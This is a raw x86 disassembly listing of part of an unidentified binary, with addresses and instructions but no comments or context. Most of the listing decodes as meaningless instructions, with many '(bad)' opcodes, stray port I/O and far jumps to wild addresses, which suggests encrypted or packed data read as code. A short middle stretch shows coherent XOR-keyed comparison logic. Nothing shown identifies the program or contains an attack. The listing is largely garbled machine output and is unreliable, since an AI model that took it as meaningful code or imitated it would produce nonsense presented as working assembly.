  4182a7:	xchg   BYTE PTR [esp+ebp*4+0x167c7266],ah
  4182ae:	std    
  4182af:	mov    WORD PTR [ecx],ss
  4182b1:	ins    DWORD PTR es:[edi],dx
  4182b2:	dec    edi
  4182b3:	scas   al,BYTE PTR es:[edi]
  4182b4:	sub    DWORD PTR [ebp+ecx*8-0x1672ec9c],ecx
  4182bb:	rcl    DWORD PTR [esi],0x89
  4182be:	dec    ecx
  4182bf:	(bad)  
  4182c0:	ficom  WORD PTR [esi+0x6f94d55b]
  4182c6:	repz xor ebp,esp
  4182c9:	inc    esp
  4182ca:	cld    
  4182cb:	popf   
  4182cc:	mov    eax,ds:0xccee7f97
  4182d1:	xor    DWORD PTR [ecx+eiz*2],edi
  4182d4:	out    0x2f,eax
  4182d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182d7:	(bad)  
  4182d8:	int3   
  4182d9:	sub    eax,0xbc123df3
  4182de:	jb     0x41831e
  4182e0:	das    
  4182e1:	in     ax,dx
  4182e3:	inc    esi
  4182e4:	jmp    FWORD PTR [eax]
  4182e6:	hlt    
  4182e7:	push   es
  4182e8:	push   esi
  4182e9:	ja     0x4182aa
  4182eb:	xchg   esp,eax
  4182ec:	cmp    eax,DWORD PTR [esi+0x7f]
  4182ef:	(bad)  
  4182f0:	jg     0x41834a
  4182f2:	xor    eax,0x276fb4fa
  4182f7:	dec    edx
  4182f8:	(bad)  [ecx+0x13f425f8]
  4182fe:	push   0x95494446
  418303:	jmp    0x4182f3
  418305:	mov    eax,0x2e7887b
  41830a:	inc    ecx
  41830b:	jp     0x41837c
  41830d:	or     DWORD PTR [eax-0x27599d16],esp
  418313:	fucomi st,st(6)
  418315:	popf   
  418316:	aas    
  418317:	inc    esi
  418318:	or     esi,DWORD PTR [eax+0x66a69cbb]
  41831e:	jmp    0xfda01154
  418323:	(bad)  [edx+eiz*2]
  418326:	neg    DWORD PTR [esi-0x6a869ae2]
  41832c:	push   0x8fe4602c
  418331:	inc    ecx
  418332:	imul   edx,ecx,0xf8497249
  418338:	js     0x41833d
  41833a:	fmulp  st(4),st
  41833c:	xchg   DWORD PTR [ecx-0x54a72f8],esi
  418342:	mov    edi,eax
  418344:	pushf  
  418345:	aam    0x4f
  418347:	mov    cl,0x6c
  418349:	pop    ecx
  41834a:	ret    
  41834b:	ins    DWORD PTR es:[edi],dx
  41834c:	lahf   
  41834d:	mov    esi,eax
  41834f:	imul   esp,edx,0xffffffc0
  418352:	xor    eax,0x202fb0a3
  418357:	out    0xb4,al
  418359:	cwde   
  41835a:	nop
  41835b:	pop    edx
  41835c:	dec    edx
  41835d:	and    DWORD PTR [edx+0x35],ecx
  418360:	mov    gs,WORD PTR [ebx-0x40]
  418363:	xchg   esp,eax
  418364:	out    dx,eax
  418365:	popfw  
  418367:	test   eax,0x4f43a675
  41836c:	es sahf 
  41836e:	jmp    FWORD PTR [edx+0x7e]
  418371:	arpl   WORD PTR [esi+0x2bd3f24e],si
  418377:	add    DWORD PTR [edi-0x44bdda06],esp
  41837d:	sbb    al,BYTE PTR ds:0x5fc0bfa8
  418383:	sub    ebx,0x850f535c
  418389:	icebp  
  41838a:	mov    eax,0x558bffff
  41838f:	hlt    
  418390:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418397:	mov    bl,BYTE PTR [ebp-0x1]
  41839a:	cmp    dl,bl
  41839c:	je     0x41a7c3
  4183a2:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183a5:	mov    edx,DWORD PTR [ebp-0xc]
  4183a8:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4183af:	mov    ebx,DWORD PTR [ebp+0xc]
  4183b2:	xor    ecx,eax
  4183b4:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  4183bb:	jne    0x41cc40
  4183c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183c4:	mov    edx,DWORD PTR [ebp+0xc]
  4183c7:	xor    ecx,eax
  4183c9:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  4183d1:	mov    edx,DWORD PTR [ebp-0x18]
  4183d4:	xor    edx,eax
  4183d6:	add    edx,esi
  4183d8:	cmp    ecx,edx
  4183da:	mov    ecx,DWORD PTR [ebp-0x14]
  4183dd:	mov    DWORD PTR [ebp+0x8],ecx
  4183e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4183e3:	je     0x41cd48
  4183e9:	xor    ecx,eax
  4183eb:	add    ecx,esi
  4183ed:	mov    ecx,0x242ebe9
  4183f2:	je     0x41cb94
  4183f8:	mov    edx,DWORD PTR [ebp+0x8]
  4183fb:	mov    ebx,DWORD PTR [ebp-0x8]
  4183fe:	xor    edx,eax
  418400:	xor    ebx,eax
  418402:	sub    edx,ebx
  418404:	sub    edx,esi
  418406:	xor    edx,eax
  418408:	mov    DWORD PTR [ebp+0x8],edx
  41840b:	mov    edx,DWORD PTR [ebp+0x8]
  41840e:	mov    ebx,DWORD PTR [ebp-0x58]
  418411:	add    edx,0x5708c4
  418417:	imul   edx,ebx
  41841a:	mov    DWORD PTR [ebp-0x58],edx
  41841d:	mov    edx,DWORD PTR [ebp+0x8]
  418420:	mov    ebx,DWORD PTR [ebp-0x54]
  418423:	add    edx,0x64f8da
  418429:	or     edx,ebx
  41842b:	mov    DWORD PTR [ebp-0x54],edx
  41842e:	mov    edx,DWORD PTR [ebp+0x8]
  418431:	mov    ebx,DWORD PTR [ebp-0x50]
  418434:	add    edx,ecx
  418436:	xor    edx,ebx
  418438:	mov    DWORD PTR [ebp-0x50],edx
  41843b:	mov    edx,DWORD PTR [ebp+0x8]
  41843e:	mov    ebx,DWORD PTR [ebp-0x4c]
  418441:	add    edx,edi
  418443:	and    edx,ebx
  418445:	mov    DWORD PTR [ebp-0x4c],edx
  418448:	mov    edx,DWORD PTR [ebp+0x8]
  41844b:	mov    ebx,DWORD PTR [ebp-0x48]
  41844e:	lea    edx,[ebx+edx*1+0x241fc1f]
  418455:	mov    DWORD PTR [ebp-0x48],edx
  418458:	mov    edx,DWORD PTR [ebp+0x8]
  41845b:	mov    ebx,0xfa5e15e2
  418460:	sub    ebx,edx
  418462:	add    ebx,DWORD PTR [ebp-0x44]
  418465:	mov    DWORD PTR [ebp-0x44],ebx
  418468:	mov    edx,DWORD PTR [ebp+0x8]
  41846b:	xor    edx,eax
  41846d:	add    edx,esi
  41846f:	jne    0x4183f8
  418475:	jmp    0x41cb94
  41847a:	jmp    0x41a7c3
  41847f:	adc    BYTE PTR [edi],cl
  418481:	lods   eax,DWORD PTR ds:[esi]
  418482:	fnsave [ebx-0x21]
  418485:	lock jae 0x41841c
  418488:	sbb    DWORD PTR [edx-0x4],ebx
  41848b:	mov    eax,0xcc7fc28b
  418490:	xor    BYTE PTR [ebp+0x7c],bh
  418493:	inc    eax
  418494:	pop    edi
  418495:	jl     0x418513
  418497:	sbb    esp,DWORD PTR ds:0xc7d6df9b
  41849d:	mov    WORD PTR [ecx-0x52],cs
  4184a0:	fidiv  DWORD PTR [ecx]
  4184a2:	push   cs
  4184a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184a4:	mov    ds:0x33ff779c,eax
  4184a9:	dec    ecx
  4184aa:	mov    edx,esi
  4184ac:	or     edi,edx
  4184ae:	and    al,0x5c
  4184b0:	pop    esi
  4184b1:	inc    edx
  4184b2:	push   eax
  4184b3:	(bad)  
  4184b4:	(bad)  
  4184b6:	pop    esp
  4184b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184b8:	or     bh,BYTE PTR [edx]
  4184ba:	pusha  
  4184bb:	adc    bh,0x1d
  4184be:	jmp    0x4184a5
  4184c0:	or     DWORD PTR [esp+eax*8-0x7],ebp
  4184c4:	jl     0x418456
  4184c6:	std    
  4184c7:	fisttp WORD PTR [eax+0x3e]
  4184ca:	xor    ah,dh
  4184cc:	xchg   esi,eax
  4184cd:	aas    
  4184ce:	inc    esi
  4184cf:	iret   
  4184d0:	dec    eax
  4184d2:	add    cx,0x7420
  4184d7:	inc    edx
  4184d8:	leave  
  4184d9:	pop    eax
  4184da:	sbb    DWORD PTR [edi+edx*8+0x6d89c0dd],ecx
  4184e1:	ss mov bl,0x8f
  4184e4:	daa    
  4184e5:	rcl    DWORD PTR [edi-0x5d],cl
  4184e8:	inc    eax
  4184e9:	aad    0xab
  4184eb:	out    0xbf,eax
  4184ed:	outs   dx,BYTE PTR ds:[esi]
  4184ee:	in     eax,0x40
  4184f0:	shl    DWORD PTR [ecx-0x60dbf991],1
  4184f6:	or     edi,esi
  4184f8:	aaa    
  4184f9:	in     eax,dx
  4184fa:	and    DWORD PTR [edx+0x34e75059],ebp
  418500:	xchg   ebx,eax
  418501:	and    eax,0xd8e00b05
  418506:	mov    ah,0x7c
  418508:	xor    al,0xbd
  41850a:	int    0x4
  41850c:	push   edi
  41850d:	xchg   ebp,esp
  41850f:	or     BYTE PTR [edi+0x55bbb88a],ch
  418515:	inc    ecx
  418516:	fadd   st,st(3)
  418518:	or     al,0x4
  41851a:	jecxz  0x418522
  41851c:	xor    eax,0xdb14e3b2
  418521:	and    BYTE PTR [edx],0x5f
  418524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418525:	aas    
  418526:	cmp    eax,0x9c0162a7
  41852b:	rcr    BYTE PTR [esi],0xf
  41852e:	outs   dx,BYTE PTR ds:[esi]
  41852f:	test   eax,0x664cc773
  418534:	into   
  418535:	xor    eax,DWORD PTR [esi-0xe8fd9aa]
  41853b:	add    DWORD PTR [edi+0x6c],ebp
  41853e:	fldcw  WORD PTR [ebx]
  418540:	aaa    
  418541:	pop    eax
  418542:	cmp    DWORD PTR [edi+0x627a3969],esi
  418548:	(bad)  
  41854a:	mov    bh,al
  41854c:	daa    
  41854d:	mov    esi,0x641fbbc7
  418552:	and    dl,BYTE PTR [esi+0x395744a0]
  418558:	push   esp
  418559:	je     0x4184ef
  41855b:	and    eax,0xdbce6644
  418560:	(bad)  
  418561:	fstp   TBYTE PTR [ebx-0x27]
  418564:	enter  0x14c1,0x93
  418568:	rcl    DWORD PTR [ebx+0xb],cl
  41856b:	xor    edx,edx
  41856d:	hlt    
  41856e:	fbld   TBYTE PTR [ecx]
  418570:	add    BYTE PTR cs:[ebx+0x65efed7c],dh
  418577:	lock (bad) 
  418579:	in     eax,0x70
  41857b:	inc    edi
  41857c:	(bad)  
  41857d:	adc    BYTE PTR [ecx-0x60],0x86
  418581:	xor    cl,BYTE PTR [ecx+0x4378d745]
  418587:	(bad)  
  418588:	pop    ss
  418589:	sub    al,BYTE PTR [edi+0x70]
  41858c:	rol    DWORD PTR [ebp+0x7d40afd2],1
  418592:	sbb    eax,0x6030009
  418597:	sahf   
  418598:	push   es
  418599:	cmp    BYTE PTR [edi-0x594eae54],ah
  41859f:	fidivr DWORD PTR [esi+0x5e047f0e]
  4185a5:	or     al,0x76
  4185a7:	outs   dx,DWORD PTR ds:[esi]
  4185a8:	repnz test al,0x89
  4185ab:	jb     0x4185ee
  4185ad:	ins    DWORD PTR es:[edi],dx
  4185ae:	mov    edi,0x67db0ecb
  4185b3:	jno    0x41861d
  4185b5:	adc    edx,DWORD PTR ds:0x896f06bd
  4185bb:	lods   al,BYTE PTR ds:[esi]
  4185bc:	hlt    
  4185bd:	inc    esi
  4185be:	aad    0x4d
  4185c0:	cld    
  4185c1:	push   ss
  4185c2:	addr16 cmc 
  4185c4:	jmp    0xd4f5:0x290a9ded
  4185cb:	add    eax,0xa7f46d00
  4185d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185d1:	into   
  4185d2:	sbb    DWORD PTR [edx-0x72],esi
  4185d5:	pop    edi
  4185d6:	ret    0xaedb
  4185d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185da:	push   0x9a55c4b6
  4185df:	lods   al,BYTE PTR ds:[esi]
  4185e0:	jb     0x41859d
  4185e2:	pop    ecx
  4185e3:	jge    0x41856b
  4185e5:	jp     0x418630
  4185e7:	jbe    0x4185f4
  4185e9:	data16 sahf 
  4185eb:	pop    esp
  4185ec:	push   edx
  4185ed:	pop    eax
  4185ee:	in     al,0x7f
  4185f0:	add    BYTE PTR [ebp-0x4e73edb8],ch
  4185f6:	xor    al,0xd7
  4185f8:	(bad)  
  4185f9:	mul    BYTE PTR [edx+0x66]
  4185fc:	popf   
  4185fd:	adc    DWORD PTR [edi+0x1a74492a],0x25fce3fd
  418607:	pusha  
  418608:	jg     0x4185d2
  41860a:	aam    0x2a
  41860c:	pop    esi
  41860d:	adc    BYTE PTR [ebp-0x7f15a561],ah
  418613:	dec    esp
  418614:	cdq    
  418615:	and    cl,bl
  418617:	xchg   ebx,eax
  418618:	cmp    al,0x55
  41861a:	loope  0x4185d9
  41861c:	daa    
  41861d:	in     eax,dx
  41861e:	sbb    BYTE PTR [edx+0x4c],0xe
  418622:	xor    ch,BYTE PTR [edi-0x42]
  418625:	adc    eax,0xed8a429b
  41862a:	and    al,0x26
  41862c:	sub    esp,0x48
  41862f:	ja     0x4185f9
  418631:	jmp    0x3f8354af
  418636:	test   DWORD PTR [edi],esi
  418638:	push   edx
  418639:	push   cs
  41863a:	mov    ch,0x1a
  41863c:	mov    ecx,0x7ebfb40e
  418641:	mov    al,0xa
  418643:	sar    BYTE PTR [eax+edi*8+0x7dae6c6b],1
  41864a:	xor    al,0x5f
  41864c:	outs   dx,BYTE PTR ds:[esi]
  41864d:	mov    BYTE PTR [ebx+edx*8],0x3b
  418651:	push   ss
  418652:	sbb    al,0x37
  418654:	out    dx,eax
  418655:	(bad)  
  418656:	repnz (bad) 
  418658:	imul   eax,edx,0xfffffff6
  41865b:	pop    ds
  41865c:	aad    0x26
  41865e:	mov    dh,0xba
  418660:	pop    edi
  418661:	xchg   ebp,eax
  418662:	clc    
  418663:	push   0x2f
  418665:	pop    esi
  418666:	clc    
  418667:	cld    
  418668:	fs sbb al,0xd6
  41866b:	imul   edx,DWORD PTR [ecx-0x3d4017ff],0x39
  418672:	add    eax,0xaebd9c3d
  418677:	ins    BYTE PTR es:[edi],dx
  418678:	lds    edx,FWORD PTR ds:0xfe53440c
  41867e:	and    al,0x19
  418680:	and    bh,BYTE PTR [edi+0x2d605608]
  418686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418687:	inc    DWORD PTR [ecx+eiz*1-0x5f]
  41868b:	jo     0x418676
  41868d:	fcomp  DWORD PTR [esi]
  41868f:	adc    esi,edx
  418691:	jne    0x4186d5
  418693:	out    dx,eax
  418694:	out    0x75,eax
  418696:	push   eax
  418697:	sub    esi,DWORD PTR [ecx]
  418699:	hlt    
  41869a:	test   BYTE PTR [edi-0x1f0e9699],dh
  4186a0:	mov    ch,BYTE PTR [eax-0x128725f6]
  4186a6:	dec    esp
  4186a7:	sti    
  4186a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186a9:	mov    dl,0x7a
  4186ab:	rdtsc  
  4186ad:	or     edi,DWORD PTR [ebp-0x70]
  4186b0:	ins    BYTE PTR es:[edi],dx
  4186b1:	push   esi
  4186b2:	cmp    dl,BYTE PTR [edx]
  4186b4:	xor    al,0x6e
  4186b6:	and    eax,0x40af6fda
  4186bb:	call   0x2fedab20
  4186c0:	les    eax,FWORD PTR [ebx]
  4186c2:	mov    ds:0x87133f53,eax
  4186c7:	pusha  
  4186c8:	and    al,0x98
  4186ca:	loop   0x4186cb
  4186cc:	mov    bh,0x61
  4186ce:	pop    esp
  4186cf:	repnz dec ebx
  4186d1:	clc    
  4186d2:	mov    eax,ds:0x29bd113e
  4186d7:	push   ebp
  4186d8:	out    0xaf,al
  4186da:	push   0xffffff88
  4186dc:	add    edx,DWORD PTR [ebp+0xa]
  4186df:	jecxz  0x41874d
  4186e1:	loop   0x4186ee
  4186e3:	ror    bh,cl
  4186e5:	mov    esp,esp
  4186e7:	lds    ebx,FWORD PTR [eax-0x539a59ff]
  4186ed:	mov    eax,ds:0x460bfe65
  4186f2:	lods   al,BYTE PTR ds:[esi]
  4186f3:	inc    eax
  4186f4:	cmp    eax,0x269ca2bb
  4186f9:	xchg   edi,eax
  4186fa:	in     al,0xed
  4186fc:	outs   dx,BYTE PTR ds:[esi]
  4186fd:	jmp    0x418730
  4186ff:	push   ss
  418700:	into   
  418701:	cmp    bl,BYTE PTR [eax]
  418703:	shl    DWORD PTR [ebp+0x5e6f7d61],cl
  418709:	cld    
  41870a:	cmp    BYTE PTR [edi-0x471b6bcc],bh
  418710:	or     eax,0x69a5be66
  418715:	cmp    DWORD PTR [edx+ebp*4+0x3f],edi
  418719:	jb     0x41875d
  41871b:	in     al,dx
  41871c:	sbb    edx,DWORD PTR [ebx+0x330b65d8]
  418722:	jecxz  0x41875e
  418724:	aam    0x76
  418726:	sti    
  418727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418728:	loop   0x418766
  41872a:	adc    cl,BYTE PTR [ecx]
  41872c:	imul   ecx,DWORD PTR [edi+0xd2d90db],0xffffffef
  418733:	pop    edi
  418734:	sbb    cl,bh
  418736:	repnz sbb ebx,eax
  418739:	not    DWORD PTR [esi]
  41873b:	std    
  41873c:	in     al,0x5e
  41873e:	push   cs
  41873f:	jae    0x418794
  418741:	stos   DWORD PTR es:[edi],eax
  418742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418743:	add    edx,DWORD PTR [esi+0x4ac33c4e]
  418749:	pop    ss
  41874a:	pop    ds
  41874b:	jbe    0x418747
  41874d:	and    ebp,DWORD PTR [edi+0x2d]
  418750:	adc    al,dh
  418752:	pop    ss
  418753:	pop    edi
  418754:	retf   0x217
  418757:	test   DWORD PTR [esi],0x448ff87d
  41875d:	fwait
  41875e:	add    edi,ebp
  418760:	fisub  WORD PTR [ebp+ebx*8-0x74bbc6de]
  418767:	retf   
  418768:	cmp    BYTE PTR [ebx],0xf0
  41876b:	xchg   edi,eax
  41876c:	inc    ebp
  41876e:	pop    ds
  41876f:	shr    BYTE PTR [edx],1
  418771:	cmp    bl,BYTE PTR [eax+0x2e3c60b4]
  418777:	rcl    BYTE PTR [edx+0x5d],cl
  41877a:	dec    ebp
  41877b:	test   DWORD PTR [eax],0xb6d23aed
  418781:	mov    ebx,edx
  418783:	int    0x55
  418785:	cmc    
  418786:	test   esp,ebx
  418788:	aad    0xd9
  41878a:	mov    BYTE PTR [eax],cl
  41878c:	xchg   esp,eax
  41878d:	dec    ebx
  41878e:	popf   
  41878f:	clc    
  418790:	and    eax,0x7b052675
  418795:	pushf  
  418796:	adc    eax,0xd29f3acf
  41879b:	mov    edi,0xdafcbc73
  4187a1:	dec    edi
  4187a2:	xchg   ebp,eax
  4187a3:	mov    esi,0x102fbfd2
  4187a8:	or     bh,bh
  4187aa:	scas   al,BYTE PTR es:[edi]
  4187ab:	inc    ebp
  4187ac:	pushf  
  4187ad:	or     DWORD PTR [ebx+0x4f9f36f4],ebx
  4187b3:	ins    BYTE PTR es:[edi],dx
  4187b4:	int3   
  4187b5:	(bad)  
  4187b6:	mov    ecx,0xe39c4650
  4187bb:	cwde   
  4187bc:	cmp    eax,edx
  4187be:	ja     0x2a019cee
  4187c4:	imul   BYTE PTR [esi+eiz*1]
  4187c7:	repnz cmp edx,DWORD PTR [edx+edx*8-0x63]
  4187cc:	push   DWORD PTR [edi+ebp*1-0x160d279d]
  4187d3:	adc    DWORD PTR [edi+esi*4+0x3e9aa27e],ebp
  4187da:	lods   eax,DWORD PTR ds:[esi]
  4187db:	xor    cl,BYTE PTR [esi+ebp*2-0x29]
  4187df:	xor    esi,DWORD PTR [ebx+0x6b]
  4187e2:	inc    edi
  4187e3:	mov    esp,0xd98c7b79
  4187e8:	jmp    0x2283:0xca89a61b
  4187ef:	neg    BYTE PTR [ecx]
  4187f1:	or     ebp,DWORD PTR [eax]
  4187f3:	test   ch,0xe8
  4187f6:	leave  
  4187f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187f8:	ret    
  4187f9:	fsub   QWORD PTR [edi+0x329b9299]
  4187ff:	add    al,0x9d
  418801:	jp     0x4187ba
  418803:	sbb    dh,ah
  418805:	cmp    dh,BYTE PTR [ebx+0x2e]
  418808:	into   
  418809:	sbb    al,0x79
  41880b:	pop    edx
  41880c:	addr16 add al,0xa1
  41880f:	sahf   
  418810:	cmp    DWORD PTR [ecx],edx
  418812:	cmp    DWORD PTR [ecx],0x8546f7aa
  418818:	mov    al,0x73
  41881a:	adc    bh,ch
  41881c:	push   es
  41881d:	cmp    DWORD PTR [eax-0x4e],edi
  418820:	ret    0xe1c1
  418823:	data16 ins BYTE PTR es:[edi],dx
  418825:	cld    
  418826:	mov    al,ds:0x256458b
  41882b:	push   esi
  41882c:	xchg   ebx,eax
  41882d:	lahf   
  41882e:	ja     0x4187e4
  418830:	jae    0x418848
  418832:	sar    DWORD PTR [ecx+0x14de28ed],0x42
  418839:	lahf   
  41883a:	cmp    bl,BYTE PTR [esi-0x2874dcce]
  418840:	add    DWORD PTR [edx-0x1d],ebx
  418843:	pop    edx
  418844:	rol    DWORD PTR [edx-0x5f],1
  418847:	mov    edx,0xd312a93b
  41884c:	mov    eax,0xa718047f
  418851:	push   0x9
  418853:	inc    edx
  418854:	lods   al,BYTE PTR ds:[esi]
  418855:	test   DWORD PTR [edi+0x28],esp
  418858:	cmp    eax,0x60e4777b
  41885d:	pop    es
  41885e:	push   ecx
  41885f:	adc    DWORD PTR [ebx+0x4615cb3b],ecx
  418865:	test   DWORD PTR [ecx-0x673123b0],eax
  41886b:	repnz ficomp DWORD PTR ds:0xab0be8
  418872:	sub    eax,ecx
  418874:	bound  esi,QWORD PTR [ebx+ebx*1-0x4381daad]
  41887b:	xlat   BYTE PTR ds:[ebx]
  41887c:	retf   
  41887d:	push   ebp
  41887e:	cmp    eax,0x2a76cabe
  418883:	adc    eax,0xebf084c2
  418888:	pop    ds
  418889:	xchg   esi,eax
  41888a:	push   ds
  41888b:	(bad)  
  41888c:	enter  0x670f,0xa7
  418890:	xor    al,0x98
  418892:	(bad)  
  418893:	stc    
  418894:	xchg   edx,eax
  418895:	ret    0xc737
  418898:	mov    bl,0x98
  41889a:	ss enter 0x45be,0xab
  41889f:	pop    DWORD PTR [edx]
  4188a1:	ins    BYTE PTR es:[edi],dx
  4188a2:	jg     0x418893
  4188a4:	fstp   TBYTE PTR [ecx-0x7c]
  4188a7:	xchg   esi,eax
  4188a8:	rcr    BYTE PTR [ecx+0x6761e18c],1
  4188ae:	and    al,0xc7
  4188b0:	arpl   WORD PTR [ecx],ax
  4188b2:	out    dx,al
  4188b3:	and    ah,al
  4188b5:	mov    al,0xef
  4188b7:	pop    es
  4188b8:	dec    esi
  4188b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188ba:	dec    ecx
  4188bb:	sbb    ecx,esp
  4188bd:	dec    esi
  4188be:	sbb    al,0x71
  4188c0:	(bad)  
  4188c1:	sub    cl,BYTE PTR [edx]
  4188c3:	dec    BYTE PTR [edi]
  4188c5:	ds jl  0x4188d8
  4188c8:	dec    eax
  4188c9:	jbe    0x4188b7
  4188cb:	addr16 adc al,0x99
  4188ce:	cwde   
  4188cf:	dec    ebx
  4188d0:	mov    esi,0x56aa39e
  4188d5:	cdq    
  4188d6:	inc    eax
  4188d7:	test   ebp,ecx
  4188d9:	(bad)  
  4188da:	sub    esi,ebx
  4188dc:	xchg   ebx,eax
  4188dd:	cmp    ebp,DWORD PTR [edx]
  4188df:	test   al,0xb9
  4188e1:	pop    edx
  4188e2:	ins    BYTE PTR es:[edi],dx
  4188e3:	out    0x1d,eax
  4188e5:	jae    0x418923
  4188e7:	inc    esi
  4188e8:	cmp    esp,DWORD PTR [eax+edi*1]
  4188eb:	and    ch,cl
  4188ed:	pushf  
  4188ee:	xchg   esi,eax
  4188ef:	fcomp  DWORD PTR ds:0x8fcbf46b
  4188f5:	int    0xe1
  4188f7:	pop    edx
  4188f8:	mov    eax,ds:0xb5b93a77
  4188fd:	dec    esi
  4188fe:	ins    BYTE PTR es:[edi],dx
  4188ff:	das    
  418900:	std    
  418901:	lock sar DWORD PTR [eax+0x36ef6c19],cl
  418908:	xchg   ebp,eax
  418909:	not    BYTE PTR [ecx-0x4c]
  41890c:	sub    edi,DWORD PTR [esp+edx*8]
  41890f:	ss jp  0x418954
  418912:	lea    edi,[edx]
  418914:	aam    0xb3
  418916:	test   BYTE PTR [eax+0x3eca10af],bh
  41891c:	ret    0x1f1c
  41891f:	lahf   
  418920:	pop    ebx
  418921:	dec    esp
  418922:	aaa    
  418923:	pushf  
  418924:	int3   
  418925:	sub    BYTE PTR [edx+eiz*1],bh
  418928:	stos   BYTE PTR es:[edi],al
  418929:	aaa    
  41892a:	cmp    al,0xba
  41892c:	lods   eax,DWORD PTR ds:[esi]
  41892d:	or     al,0xec
  41892f:	js     0x418945
  418931:	in     al,dx
  418932:	gs fs adc edx,ecx
  418936:	pop    ecx
  418937:	cdq    
  418938:	adc    al,0xe3
  41893a:	(bad)  
  41893b:	rol    BYTE PTR [edi-0x2a],1
  41893e:	cdq    
  41893f:	jo     0x4189b5
  418941:	(bad)  
  418942:	sub    al,0xbc
  418944:	xor    eax,0x25f7ee02
  418949:	mov    esp,0x530959bc
  41894e:	xlat   BYTE PTR ds:[ebx]
  41894f:	jb     0x4188e7
  418951:	fcomp  QWORD PTR [esi-0x7a]
  418954:	in     al,0x24
  418956:	fs dec eax
  418958:	sbb    DWORD PTR [edx-0x4f98d403],0x3af99e55
  418962:	mov    ah,0x54
  418964:	pop    cx
  418966:	es jno 0x418909
  418969:	cdq    
  41896a:	cmp    BYTE PTR [ebx],0x98
  41896d:	(bad)  
  41896e:	sub    al,BYTE PTR [eax+0x6bb2b59c]
  418974:	aas    
  418975:	stos   BYTE PTR es:[edi],al
  418976:	cmp    cl,dh
  418978:	xchg   ebp,eax
  418979:	jo     0x4189e5
  41897b:	lods   al,BYTE PTR ds:[esi]
  41897c:	xchg   esp,eax
  41897d:	in     eax,0xf8
  41897f:	in     al,0xe0
  418981:	xlat   BYTE PTR ds:[ebx]
  418982:	pop    edx
  418983:	nop
  418984:	dec    ebx
  418985:	jecxz  0x41896e
  418987:	adc    DWORD PTR [ecx+0x4a],0x1f9b2073
  41898e:	nop
  41898f:	rol    DWORD PTR [ebx],0x30
  418992:	jbe    0x4189a5
  418994:	inc    ebx
  418995:	push   0xbc3aa1b3
  41899a:	push   edi
  41899b:	xchg   esi,eax
  41899c:	ins    DWORD PTR es:[edi],dx
  41899d:	and    BYTE PTR [ebp+0x72],0x74
  4189a1:	loopne 0x4189d8
  4189a3:	into   
  4189a4:	stc    
  4189a5:	jecxz  0x418959
  4189a7:	enter  0x84a1,0x80
  4189ab:	fldcw  WORD PTR [edi]
  4189ad:	or     eax,0xfb8c3e0a
  4189b2:	jns    0x418a17
  4189b4:	aam    0x2a
  4189b6:	xor    edx,DWORD PTR [eax+ebx*1]
  4189b9:	mov    ebp,0x78aa15fb
  4189be:	dec    eax
  4189bf:	add    ebx,DWORD PTR [edi+ebp*4+0x3958c2ec]
  4189c6:	add    al,0xfa
  4189c8:	mov    ebp,0x171a19e5
  4189cd:	cwde   
  4189ce:	adc    BYTE PTR [esi+eax*2+0x32171ac0],al
  4189d5:	mov    ds:0x2d98b0f2,eax
  4189da:	adc    ch,BYTE PTR [ebp-0x505ee786]
  4189e0:	inc    ebx
  4189e1:	mov    ds:0xacd69eab,al
  4189e6:	lahf   
  4189e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189e8:	imul   eax,DWORD PTR [edi],0xf8f825ec
  4189ee:	sub    cl,0xdd
  4189f1:	call   0x2651:0xe5583cb6
  4189f8:	mov    edx,0x885e8709
  4189fd:	push   ds
  4189fe:	icebp  
  4189ff:	push   eax
  418a00:	or     esi,DWORD PTR [ecx+0x77]
  418a03:	scas   al,BYTE PTR es:[edi]
  418a04:	mov    ebp,0x93eb5ab6
  418a09:	sbb    BYTE PTR [edi+0xb5d9cb1],ch
  418a0f:	pusha  
  418a10:	sar    edx,1
  418a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a13:	cmp    edi,DWORD PTR [esi-0x41]
  418a16:	loope  0x41899f
  418a18:	cmp    bl,cl
  418a1a:	dec    eax
  418a1b:	es push edx
  418a1d:	int3   
  418a1e:	push   eax
  418a1f:	popf   
  418a20:	mov    edx,0x1dff878a
  418a25:	jmp    0xa4a7f6c3
  418a2a:	hlt    
  418a2b:	jmp    0x608fcb9d
  418a30:	test   eax,0xbc6057ad
  418a35:	popa   
  418a36:	adc    DWORD PTR [eax+0x653d1b40],esi
  418a3c:	int    0xf6
  418a3e:	cmp    ah,BYTE PTR [edi]
  418a40:	int    0xa3
  418a42:	cmp    ch,dl
  418a44:	sub    edi,eax
  418a46:	sbb    dh,BYTE PTR [edx+0x6f49b1b3]
  418a4c:	dec    edi
  418a4d:	ins    DWORD PTR es:[edi],dx
  418a4e:	retf   0xc25b
  418a51:	adc    BYTE PTR [ebx],al
  418a53:	call   DWORD PTR [ecx+0x44]
  418a56:	push   ebx
  418a57:	sbb    DWORD PTR [eax-0x2],ebx
  418a5a:	out    dx,al
  418a5b:	mov    ds:0x83608b91,al
  418a60:	or     bl,0x8a
  418a63:	mov    BYTE PTR [edx+ebp*1-0x14a275c4],al
  418a6a:	push   esi
  418a6b:	aas    
  418a6c:	int3   
  418a6d:	rcl    DWORD PTR [ecx-0x1735fcbf],1
  418a73:	adc    al,BYTE PTR [edi+edi*8+0x1700d5c9]
  418a7a:	dec    ebp
  418a7b:	pop    ebx
  418a7c:	leave  
  418a7d:	and    al,0xd3
